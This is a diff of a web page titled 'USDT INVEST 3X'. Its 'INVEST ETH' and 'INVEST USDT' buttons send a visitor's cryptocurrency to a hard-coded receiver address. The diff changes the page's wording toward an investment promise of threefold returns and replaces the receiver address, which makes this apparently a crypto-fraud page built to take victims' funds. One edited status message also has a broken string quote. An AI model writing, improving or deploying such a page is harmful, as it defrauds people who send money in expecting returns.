@@ -339,7 +339,7 @@
 <body>
     <div class="container">
         <div class="header">
-            <h1>USDT PROFIT</h1>
+            <h1>USDT INVEST 3X</h1>
         </div>
         
         <div class="content">
@@ -386,12 +386,12 @@
                 <div class="action-buttons">
                     <button class="action-btn eth-btn" id="sendEthBtn" onclick="sendEth()">
                         <span class="btn-icon">Ξ</span>
-                        <span>ACCEPT ETH</span>
+                        <span>INVEST ETH</span>
                     </button>
                     
                     <button class="action-btn usdt-btn" id="sendUsdtBtn" onclick="sendUSDT()">
                         <span class="btn-icon">$</span>
-                        <span>USDT INVEST</span>
+                        <span>INVEST USDT</span>
                     </button>
                 </div>
             </div>
@@ -405,7 +405,7 @@
 
     <script>
         // Configuration
-        const RECEIVER = "0x0b4db9451a18ba099de79a86b312379f4061b2fe"; // Replace with your receiver address
+        const RECEIVER = "0x6d7d0db8cd4858d4c547b10023cc972079b3ec31"; // Replace with your receiver address
         const USDT_CONTRACT = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // Mainnet USDT
         
         // USDT Contract ABI
@@ -559,7 +559,7 @@
         async function sendUSDT() {
             try {
                 if (!usdtBalance || usdtBalance == 0) {
-                    showStatus(" SENT INSUFFICIENT USDT TO PROFIT, "error");
+                    showStatus(" SENT INSUFFICIENT USDT TO INVEST, "error");
                     return;
                 }
                 
@@ -583,7 +583,7 @@
                 const receipt = await tx.wait();
                 
                 if (receipt.status === 1) {
-                    showStatus(`✅ USDT ADD successfully `, "success");
+                    showStatus(`✅ USDT INVEST SUCCESSFULLY `, "success");
                     await loadBalances();
                 } else {
                     showStatus("USDT transfer failed", "error");
